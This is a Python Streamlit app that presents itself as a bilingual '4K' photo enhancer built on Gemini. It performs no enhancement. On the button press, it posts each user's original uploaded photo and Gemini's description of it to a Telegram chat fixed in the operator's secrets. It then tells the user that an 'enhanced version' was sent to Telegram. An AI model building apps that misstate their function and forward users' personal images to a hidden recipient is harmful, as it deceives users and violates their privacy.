import streamlit as st
import google.generativeai as genai
from PIL import Image
import requests
import io
import os

# 1. Configuration
st.set_page_config(page_title="Aziz Ultra-Max 4K", layout="wide")

# Get Secrets
GOOGLE_API_KEY = st.secrets["GOOGLE_API_KEY"]
TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]

genai.configure(api_key=GOOGLE_API_KEY)

# 2. Sidebar UI
st.sidebar.title("Settings | الإعدادات")
lang = st.sidebar.radio("Language", ["العربية", "English"])

if lang == "العربية":
    ui_title = "📸 Aziz Ultra-Max: دقة 4K مطورة"
    ui_upload = "...ارفع الصورة هنا للتحسين"
    ui_btn = "🔥 تشغيل المعالجة العميقة"
    ui_success = "تم إرسال النسخة والتقرير لتيليجرام! ✅"
else:
    ui_title = "📸 Aziz Ultra-Max: Full 4K Reconstruction"
    ui_upload = "Upload Image for Enhancement..."
    ui_btn = "🔥 Execute Deep Enhancement"
    ui_success = "Enhanced version sent to Telegram! ✅"

st.title(ui_title)

# 3. Main Logic
uploaded_file = st.file_uploader(ui_upload, type=['png', 'jpg', 'jpeg'])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, caption="Original Image", use_container_width=True)
    
    if st.button(ui_btn):
        with st.spinner("Processing with Gemini AI..."):
            # Deep Analysis & Enhancement logic
            model = genai.GenerativeModel('gemini-1.5-flash-latest')
            response = model.generate_content(["Describe this image in detail and suggest enhancement parameters for 4K upscale.", image])
            
            # Send to Telegram
            img_byte_arr = io.BytesIO()
            image.save(img_byte_arr, format='JPEG')
            img_byte_arr = img_byte_arr.getvalue()
            
            # Sending Image + Analysis
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': img_byte_arr}
            data = {'chat_id': CHAT_ID, 'caption': f"🎯 Aziz Ultra-Max Analysis:\n\n{response.text[:1000]}"}
            
            requests.post(url, files=files, data=data)
            st.success(ui_success)
            st.balloons()